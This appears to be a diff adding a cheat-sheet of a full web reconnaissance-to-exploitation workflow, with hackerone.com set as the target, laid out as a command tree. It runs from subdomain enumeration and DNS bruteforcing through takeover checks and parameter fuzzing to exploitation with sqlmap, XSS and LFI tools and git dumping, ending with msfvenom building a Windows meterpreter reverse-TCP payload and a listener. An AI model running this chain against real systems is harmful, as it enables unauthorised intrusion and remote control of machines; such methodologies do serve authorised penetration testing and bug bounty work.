@@ -1,0 +1,75 @@
+START: TARGET="hackerone.com"
+│
+├── 1. PASSIVE SUBDOMAIN ENUM (Stealth - No DNS queries)
+│   ├── subfinder -d $TARGET
+│   ├── amass enum -passive -d $TARGET  
+│   ├── assetfinder --subs-only $TARGET
+│   ├── findomain -t $TARGET
+│   ├── sublist3r -d $TARGET
+│   └── theHarvester -d $TARGET -b bing,google
+│                                    ↓
+│                           passive_subs.txt (UNIQUE)
+│
+├── 2. ACTIVE DNS ENUM (Direct queries)
+│   ├── dnsrecon -d $TARGET -D dnsmap.txt -t std,brt
+│   └── massdns -r resolvers.txt dnsmap.txt (bruteforce)
+│                                    ↓
+│                            active_subs.txt
+│
+├── 3. MASS RESOLUTION + WILDCARD FILTER
+│   ├── massdns -r resolvers.txt -t A all_subs.txt
+│   └── puredns resolve all_subs.txt -r resolvers.txt
+│                                    ↓
+│                             resolved_live.txt
+│
+├── 4. HTTP VERIFICATION + SCREENSHOTS
+│   ├── httpx -l resolved_live.txt -title -tech -status -ip
+│   ├── eyewitness -f resolved_live.txt --all-protocols
+│   └── aquatone -u resolved_live.txt -out aquatone
+│                                    ↓
+│                             LIVE_HOSTS.txt
+│
+├── 5. SUBDOMAIN TAKEOVER CHECK
+│   ├── knockpy -f LIVE_HOSTS.txt
+│   └── subjack -w LIVE_HOSTS.txt -t 100 -c 50 -v
+│                                    ↓
+│                           TAKEOVERS.txt ⚠️ CRITICAL
+│
+├── 6. URL/PARAMETER DISCOVERY
+│   ├── gauplus $TARGET
+│   ├── waybackurls $TARGET  
+│   ├── katana -u LIVE_HOSTS.txt -jc
+│   ├── hakrawler -d $TARGET -depth 3 -plain
+│   ├── ffuf -w urls.txt -u FUZZ -fc 404
+│   └── paramspider -d $TARGET
+│                                    ↓
+│                             ALL_URLS.txt
+│
+├── 7. PARAMETER DISCOVERY + FUZZING
+│   ├── arjun -i ALL_URLS.txt -t 100
+│   └── gf sqli,xss,redirect,lfi,rce ALL_URLS.txt
+│                                    ↓
+│                            PARAMS.txt
+│
+├── 8. VULNERABILITY SCANNING
+│   ├── nikto -h LIVE_HOSTS.txt -o nikto.txt
+│   ├── cmseek -u LIVE_HOSTS.txt
+│   ├── wafwoof LIVE_HOSTS.txt
+│   └── s3scanner -bucket target.com
+│                                    ↓
+│                          SCAN_RESULTS.txt
+│
+├── 9. EXPLOITATION TOOLS
+│   ├── dalfox file PARAMS.txt
+│   ├── xssstrike -u "PARAMS.txt"
+│   ├── sqlmap -m PARAMS.txt --batch --risk=3
+│   ├── lfisuite -f PARAMS.txt
+│   └── gitdumper https://target.com/.git/
+│                                    ↓
+│                         EXPLOIT_RESULTS.txt ⚠️
+│
+└── 10. FINAL OUTPUT + METASPLOIT
+    ├── nmap -iL LIVE_HOSTS.txt -sV -sC -oA nmap-full
+    ├── masscan -iL LIVE_HOSTS.txt --rate=10000 -p80,443
+    ├── msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip -f exe
+    └── msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp"
